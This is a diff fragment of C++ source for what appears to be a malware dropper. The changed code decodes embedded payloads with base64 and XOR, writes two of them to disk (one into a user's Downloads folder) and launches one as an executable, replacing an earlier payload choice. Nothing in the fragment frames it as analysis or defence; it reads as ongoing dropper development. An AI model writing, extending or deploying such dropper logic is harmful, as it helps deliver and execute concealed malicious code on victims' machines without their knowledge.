@@ -219,31 +219,29 @@ int main(int argc, char* argv[])
 
 	else if (os_version == 10) {
 
-//		dropper_start(3);
-		dropper_start(1);
+		dropper_start(4);
+		dropper_start(5);
+//		dropper_start(1);
 
-	#if DROPPER_BASE64 == 1
-		data1 = base64decode(data1, &size1);
-//		size3 = size3 - 1;
-//		data3 = base64decode(data3, &size3);
+	#ifdef DROPPER_BASE64 == 1
+		data4 = base64decode(data4, &size4);
+		data5 = base64decode(data5, &size5);
+//		data1 = base64decode(data1, &size1);
 	#endif
 
 	#if DROPPER_XOR_KEY != 0
-		data1 = XOR(data1, size1);
-//		data3 = XOR(data3, size3);
+		data4 = XOR(data4, size4);
+		data5 = XOR(data5, size5);
+//		data1 = XOR(data1, size1);
 	#endif
 
-		drop(size1, data1, name1, create_dir);
-//		drop(size3, data3, name3);
+		drop(size4, data4, name4, create_dir);
+		create_dir = L"C:\\Users\\adind\\Downloads\\en-US";
+		drop(size5, data5, name5, create_dir);
+//		drop(size1, data1, name1);
 
-//		bool result = non_exe_launch(name3);
-//		std::cout << "before exe_launch 2 " << std::endl;
-//		if (result == true){
-//			std::cout << "before exe_launch";
-			exe_launch(name1);
-//		} else {
-//			std::cout << "This failed and nothing happened.\n";
-//		}
+//		exe_launch(name1);
+		exe_launch(name4);
 
 #ifdef DEAD_CODE
 		// dead code
